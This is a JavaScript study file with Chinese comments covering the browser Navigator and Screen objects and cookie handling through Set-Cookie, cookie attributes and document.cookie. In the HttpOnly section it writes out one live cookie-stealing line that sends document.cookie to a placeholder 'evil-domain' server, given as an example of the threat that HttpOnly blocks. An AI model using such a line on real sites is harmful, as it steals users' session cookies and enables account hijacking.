// window.getComputedStyle()方法接受一个元素节点作为参数，返回一个包含该元素的
// 最终样式信息的对象，详见《CSS 操作》一章。
// window.matchMedia()方法用来检查 CSS 的mediaQuery语句，详见《CSS 操作》一章
// window.requestAnimationFrame() 
//=====
// Navigator 对象，Screen 对象
// window.navigator属性指向一个包含浏览器和系统信息的 Navigator 对象。脚本通过这个属性了解用户的环境信息。
// Navigator 对象的属性
// Navigator.userAgent
// navigator.userAgent属性返回浏览器的 User Agent 字符串，表示浏览器的厂商和版本信息。
// 下面是 Chrome 浏览器的userAgent。
navigator.userAgent
// "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36"
// 通过userAgent属性识别浏览器，不是一个好办法。因为必须考虑所有的情况（不同的浏览器，不同的版本），
// 非常麻烦，而且用户可以改变这个字符串。这个字符串的格式并无统一规定，也无法保证未来的适用性，
// 各种上网设备层出不穷，难以穷尽。所以，现在一般不再通过它识别浏览器了，而是使用“功能识别”方法，
// 即逐一测试当前浏览器是否支持要用到的 JavaScript 功能。
// 不过，通过userAgent可以大致准确地识别手机浏览器，方法就是测试是否包含mobi字符串。
var ua = navigator.userAgent.toLowerCase();
if (/mobi/i.test(ua)) {
  // 手机浏览器
} else {
  // 非手机浏览器
}
// 如果想要识别所有移动设备的浏览器，可以测试更多的特征字符串。
/mobi|android|touch|mini/i.test(ua)
// Navigator.plugins
// Navigator.plugins属性返回一个类似数组的对象，成员是 Plugin 实例对象，表示浏览器安装的插件，
// 比如 Flash、ActiveX 等。
var pluginsLength = navigator.plugins.length;
for (var i = 0; i < pluginsLength; i++) {
  console.log(navigator.plugins[i].name);
  console.log(navigator.plugins[i].filename);
  console.log(navigator.plugins[i].description);
  console.log(navigator.plugins[i].version);
}
// Navigator.platform
// Navigator.platform属性返回用户的操作系统信息，比如MacIntel、Win32、Linux x86_64等 。
navigator.platform// "Linux x86_64"
// Navigator.onLine
// navigator.onLine属性返回一个布尔值，表示用户当前在线还是离线（浏览器断线）。
navigator.onLine // true
// 有时，浏览器可以连接局域网，但是局域网不能连通外网。这时，有的浏览器的onLine属性会返回true，
// 所以不能假定只要是true，用户就一定能访问互联网。不过，如果是false，可以断定用户一定离线。
// 用户变成在线会触发online事件，变成离线会触发offline事件，可以通过window.ononline和window.onoffline
// 指定这两个事件的回调函数。
window.addEventListener('offline', function(e) { console.log('offline'); });
window.addEventListener('online', function(e) { console.log('online'); });
// Navigator.language，Navigator.languages
// Navigator.language属性返回一个字符串，表示浏览器的首选语言。该属性只读。
navigator.language // "en"
// Navigator.languages属性返回一个数组，表示用户可以接受的语言。Navigator.language总是这个
// 数组的第一个成员。HTTP 请求头信息的Accept-Language字段，就来自这个数组。
navigator.languages  // ["en-US", "en", "zh-CN", "zh", "zh-TW"]
// 如果这个属性发生变化，就会在window对象上触发languagechange事件。
// Navigator.geolocation
// Navigator.geolocation属性返回一个 Geolocation 对象，包含用户地理位置的信息。
// 注意，该 API 只有在 HTTPS 协议下可用，否则调用下面方法时会报错。
// Geolocation 对象提供下面三个方法。
// Geolocation.getCurrentPosition()：得到用户的当前位置
// Geolocation.watchPosition()：监听用户位置变化
// Geolocation.clearWatch()：取消watchPosition()方法指定的监听函数
// 注意，调用这三个方法时，浏览器会跳出一个对话框，要求用户给予授权。
// Navigator.cookieEnabled
// Navigator.cookieEnabled属性返回一个布尔值，表示浏览器的 Cookie 功能是否打开。
navigator.cookieEnabled // true
// 注意，这个属性反映的是浏览器总的特性，与是否储存某个具体的网站的 Cookie 无关。
// 用户可以设置某个网站不得储存 Cookie，这时cookieEnabled返回的还是true。
// Navigator 对象的方法
// Navigator.javaEnabled()
// Navigator.javaEnabled()方法返回一个布尔值，表示浏览器是否能运行 Java Applet 小程序。
navigator.javaEnabled() // false
// Navigator.sendBeacon()
// Navigator.sendBeacon()方法用于向服务器异步发送数据，详见《XMLHttpRequest 对象》一章。
// creen 对象
// Screen 对象表示当前窗口所在的屏幕，提供显示设备的信息。window.screen属性指向这个对象。
// 该对象有下面的属性。
// Screen.height：浏览器窗口所在的屏幕的高度（单位像素）。除非调整显示器的分辨率，
// 否则这个值可以看作常量，不会发生变化。显示器的分辨率与浏览器设置无关，缩放网页并不会改变分辨率。
// Screen.width：浏览器窗口所在的屏幕的宽度（单位像素）。
// Screen.availHeight：浏览器窗口可用的屏幕高度（单位像素）。因为部分空间可能不可用，
// 比如系统的任务栏或者 Mac 系统屏幕底部的 Dock 区，这个属性等于height减去那些被系统组件的高度。
// Screen.availWidth：浏览器窗口可用的屏幕宽度（单位像素）。
// Screen.pixelDepth：整数，表示屏幕的色彩位数，比如24表示屏幕提供24位色彩。
// Screen.colorDepth：Screen.pixelDepth的别名。严格地说，colorDepth 表示应用程序的颜色深度，
// pixelDepth 表示屏幕的颜色深度，绝大多数情况下，它们都是同一件事。
// Screen.orientation：返回一个对象，表示屏幕的方向。该对象的type属性是一个字符串，
// 表示屏幕的具体方向，landscape-primary表示横放，landscape-secondary表示颠倒的横放，
// portrait-primary表示竖放，portrait-secondary。
// 下面是Screen.orientation的例子。
window.screen.orientation
// { angle: 0, type: "landscape-primary", onchange: null }
// 下面的例子保证屏幕分辨率大于 1024 x 768。
if (window.screen.width >= 1024 && window.screen.height >= 768) {
  // 分辨率不低于 1024x768
}
// 下面是根据屏幕的宽度，将用户导向不同网页的代码。
if ((screen.width <= 800) && (screen.height <= 600)) {
  window.location.replace('small.html');
} else {
  window.location.replace('wide.html');
}
// =====
// Cookie
// 概述
// Cookie 是服务器保存在浏览器的一小段文本信息，每个 Cookie 的大小一般不能超过4KB。
// 浏览器每次向服务器发出请求，就会自动附上这段信息。
// Cookie 主要用来分辨两个请求是否来自同一个浏览器，以及用来保存一些状态信息。它的常用场合有以下一些。
// 对话（session）管理：保存登录、购物车等需要记录的信息。
// 个性化：保存用户的偏好，比如网页的字体大小、背景色等等。
// 追踪：记录和分析用户行为。
// 有些开发者使用 Cookie 作为客户端储存。这样做虽然可行，但是并不推荐，因为 Cookie 的
// 设计目标并不是这个，它的容量很小（4KB），缺乏数据操作接口，而且会影响性能。客户端储存
// 应该使用 Web storage API 和 IndexedDB。
// Cookie 包含以下几方面的信息。
// Cookie 的名字
// Cookie 的值（真正的数据写在这里面）
// 到期时间
// 所属域名（默认是当前域名）
// 生效的路径（默认是当前网址）
// 举例来说，用户访问网址www.example.com，服务器在浏览器写入一个 Cookie。
// 这个 Cookie 就会包含www.example.com这个域名，以及根路径/。这意味着，
// 这个 Cookie 对该域名的根路径和它的所有子路径都有效。如果路径设为/forums，
// 那么这个 Cookie 只有在访问www.example.com/forums及其子路径时才有效。以后，
// 浏览器一旦访问这个路径，浏览器就会附上这段 Cookie 发送给服务器。
// 浏览器可以设置不接受 Cookie，也可以设置不向服务器发送 Cookie。window.navigator.cookieEnabled属性
// 返回一个布尔值，表示浏览器是否打开 Cookie 功能。
// 浏览器是否打开 Cookie 功能
window.navigator.cookieEnabled // true
// document.cookie属性返回当前网页的 Cookie。
// 当前网页的 Cookie
document.cookie
// 不同浏览器对 Cookie 数量和大小的限制，是不一样的。一般来说，单个域名设置的 Cookie 
// 不应超过30个，每个 Cookie 的大小不能超过4KB。超过限制以后，Cookie 将被忽略，不会被设置。
// 浏览器的同源政策规定，两个网址只要域名相同和端口相同，就可以共享 Cookie（参见《同源政策》一章）。
// 注意，这里不要求协议相同。也就是说，http://example.com设置的 Cookie，可以被https://example.com读取。
// Cookie 与 HTTP 协议
// Cookie 由 HTTP 协议生成，也主要是供 HTTP 协议使用。
// HTTP 回应：Cookie 的生成
// 服务器如果希望在浏览器保存 Cookie，就要在 HTTP 回应的头信息里面，放置一个Set-Cookie字段。
// Set-Cookie:foo=bar
// 上面代码会在浏览器保存一个名为foo的 Cookie，它的值为bar。
// HTTP 回应可以包含多个Set-Cookie字段，即在浏览器生成多个 Cookie。下面是一个例子。
// HTTP/1.0 200 OK
// Content-type: text/html
// Set-Cookie: yummy_cookie=choco
// Set-Cookie: tasty_cookie=strawberry
// [page content]
// 除了 Cookie 的值，Set-Cookie字段还可以附加 Cookie 的属性。
// Set-Cookie: <cookie-name>=<cookie-value>; Expires=<date>
// Set-Cookie: <cookie-name>=<cookie-value>; Max-Age=<non-zero-digit>
// Set-Cookie: <cookie-name>=<cookie-value>; Domain=<domain-value>
// Set-Cookie: <cookie-name>=<cookie-value>; Path=<path-value>
// Set-Cookie: <cookie-name>=<cookie-value>; Secure
// Set-Cookie: <cookie-name>=<cookie-value>; HttpOnly
// 上面的几个属性的含义，将在后文解释。
// 一个Set-Cookie字段里面，可以同时包括多个属性，没有次序的要求。
// Set-Cookie: <cookie-name>=<cookie-value>; Domain=<domain-value>; Secure; HttpOnly
// 下面是一个例子。
// Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
// 如果服务器想改变一个早先设置的 Cookie，必须同时满足四个条件：Cookie 的key、domain、path和secure都匹配。
// 举例来说，如果原始的 Cookie 是用如下的Set-Cookie设置的。
// Set-Cookie: key1=value1; domain=example.com; path=/blog
// 改变上面这个 Cookie 的值，就必须使用同样的Set-Cookie。
// Set-Cookie: key1=value2; domain=example.com; path=/blog
// 只要有一个属性不同，就会生成一个全新的 Cookie，而不是替换掉原来那个 Cookie。
// Set-Cookie: key1=value2; domain=example.com; path=/
// 上面的命令设置了一个全新的同名 Cookie，但是path属性不一样。下一次访问example.com/blog的时候，
// 浏览器将向服务器发送两个同名的 Cookie。
// Cookie: key1=value1; key1=value2
// 上面代码的两个 Cookie 是同名的，匹配越精确的 Cookie 排在越前面。
// HTTP 请求：Cookie 的发送
// 浏览器向服务器发送 HTTP 请求时，每个请求都会带上相应的 Cookie。也就是说，
// 把服务器早前保存在浏览器的这段信息，再发回服务器。这时要使用 HTTP 头信息的Cookie字段。
// Cookie: foo=bar
// 上面代码会向服务器发送名为foo的 Cookie，值为bar。
// Cookie字段可以包含多个 Cookie，使用分号（;）分隔。
// Cookie: name=value; name2=value2; name3=value3
// 下面是一个例子。
// GET /sample_page.html HTTP/1.1
// Host: www.example.org
// Cookie: yummy_cookie=choco; tasty_cookie=strawberry
// 服务器收到浏览器发来的 Cookie 时，有两点是无法知道的。
// Cookie 的各种属性，比如何时过期。
// 哪个域名设置的 Cookie，到底是一级域名设的，还是某一个二级域名设的。
// Cookie 的属性
// Expires，Max-Age
// Expires属性指定一个具体的到期时间，到了指定时间以后，浏览器就不再保留这个 Cookie。它的值是 UTC 格式，
// 可以使用Date.prototype.toUTCString()进行格式转换。
// Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
// 如果不设置该属性，或者设为null，Cookie 只在当前会话（session）有效，浏览器窗口一旦关闭，
// 当前 Session 结束，该 Cookie 就会被删除。另外，浏览器根据本地时间，决定 Cookie 是否过期，
// 由于本地时间是不精确的，所以没有办法保证 Cookie 一定会在服务器指
// Max-Age属性指定从现在开始 Cookie 存在的秒数，比如60 * 60 * 24 * 365（即一年）。
// 过了这个时间以后，浏览器就不再保留这个 Cookie。
// 如果同时指定了Expires和Max-Age，那么Max-Age的值将优先生效。
// 如果Set-Cookie字段没有指定Expires或Max-Age属性，那么这个 Cookie 就是 Session Cookie，
// 即它只在本次对话存在，一旦用户关闭浏览器，浏览器就不会再保留这个 Cookie。
// Domain，Path
// Domain属性指定浏览器发出 HTTP 请求时，哪些域名要附带这个 Cookie。如果没有指定该属性，
// 浏览器会默认将其设为当前域名，这时子域名将不会附带这个 Cookie。比如，example.com不设置
//  Cookie 的domain属性，那么sub.example.com将不会附带这个 Cookie。如果指定了domain属性，
//  那么子域名也会附带这个 Cookie。如果服务器指定的域名不属于当前域名，浏览器会拒绝这个 Cookie。
// Path属性指定浏览器发出 HTTP 请求时，哪些路径要附带这个 Cookie。只要浏览器发现，Path属性是
//  HTTP 请求路径的开头一部分，就会在头信息里面带上这个 Cookie。比如，PATH属性是/，那么请求/docs路径
//  也会包含该 Cookie。当然，前提是域名必须一致。
// Secure，HttpOnly
// Secure属性指定浏览器只有在加密协议 HTTPS 下，才能将这个 Cookie 发送到服务器。另一方面，
// 如果当前协议是 HTTP，浏览器会自动忽略服务器发来的Secure属性。该属性只是一个开关，不需要指定值。
// 如果通信是 HTTPS 协议，该开关自动打开。
// HttpOnly属性指定该 Cookie 无法通过 JavaScript 脚本拿到，主要是document.cookie属性、XMLHttpRequest对象
// 和 Request API 都拿不到该属性。这样就防止了该 Cookie 被脚本读到，只有浏览器发出 HTTP 请求时，
// 才会带上该 Cookie。
(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
// 上面是跨站点载入的一个恶意脚本的代码，能够将当前网页的 Cookie 发往第三方服务器。如果设置了一个 
// Cookie 的HttpOnly属性，上面代码就不会读到该 Cookie。
// document.cookie
// document.cookie属性用于读写当前网页的 Cookie。
// 读取的时候，它会返回当前网页的所有 Cookie，前提是该 Cookie 不能有HTTPOnly属性。
// document.cookie // "foo=bar;baz=bar"
// 上面代码从document.cookie一次性读出两个 Cookie，它们之间使用分号分隔。必须手动还原，
// 才能取出每一个 Cookie 的值。
var cookies = document.cookie.split(';');
for (var i = 0; i < cookies.length; i++) {
  console.log(cookies[i]);
}
// foo=bar
// baz=bar
// document.cookie属性是可写的，可以通过它为当前网站添加 Cookie。
document.cookie = 'fontSize=14';
// 写入的时候，Cookie 的值必须写成key=value的形式。注意，等号两边不能有空格。另外，
// 写入 Cookie 的时候，必须对分号、逗号和空格进行转义（它们都不允许作为 Cookie 的值），
// 这可以用encodeURIComponent方法达到。
// 但是，document.cookie一次只能写入一个 Cookie，而且写入并不是覆盖，而是添加。
document.cookie = 'test1=hello';
document.cookie = 'test2=world';
document.cookie
// test1=hello;test2=world
// document.cookie读写行为的差异（一次可以读出全部 Cookie，但是只能写入一个 Cookie），
// 与 HTTP 协议的 Cookie 通信格式有关。浏览器向服务器发送 Cookie 的时候，Cookie字段是
// 使用一行将所有 Cookie 全部发送；服务器向浏览器设置 Cookie 的时候，Set-Cookie字段是一行
// 设置一个 Cookie。
// 写入 Cookie 的时候，可以一起写入 Cookie 的属性。
document.cookie = "foo=bar; expires=Fri, 31 Dec 2020 23:59:59 GMT";
// 上面代码中，写入 Cookie 的时候，同时设置了expires属性。属性值的等号两边，也是不能有空格的。
// 各个属性的写入注意点如下。
// path属性必须为绝对路径，默认为当前路径。
// domain属性值必须是当前发送 Cookie 的域名的一部分。比如，当前域名是example.com，
// 就不能将其设为foo.com。该属性默认为当前的一级域名（不含二级域名）。
// max-age属性的值为秒数。
// expires属性的值为 UTC 格式，可以使用Date.prototype.toUTCString()进行日期格式转换。
// document.cookie写入 Cookie 的例子如下。
document.cookie = 'fontSize=14; '
  + 'expires=' + someDate.toGMTString() + '; '
  + 'path=/subdirectory; '
  + 'domain=*.example.com';
// Cookie 的属性一旦设置完成，就没有办法读取这些属性的值。
// 删除一个现存 Cookie 的唯一方法，是设置它的expires属性为一个过去的日期。
document.cookie = 'fontSize=;expires=Thu, 01-Jan-1970 00:00:01 GMT';
// 上面代码中，名为fontSize的 Cookie 的值为空，过期时间设为1970年1月1月零点，就等同于删除了这个 Cookie。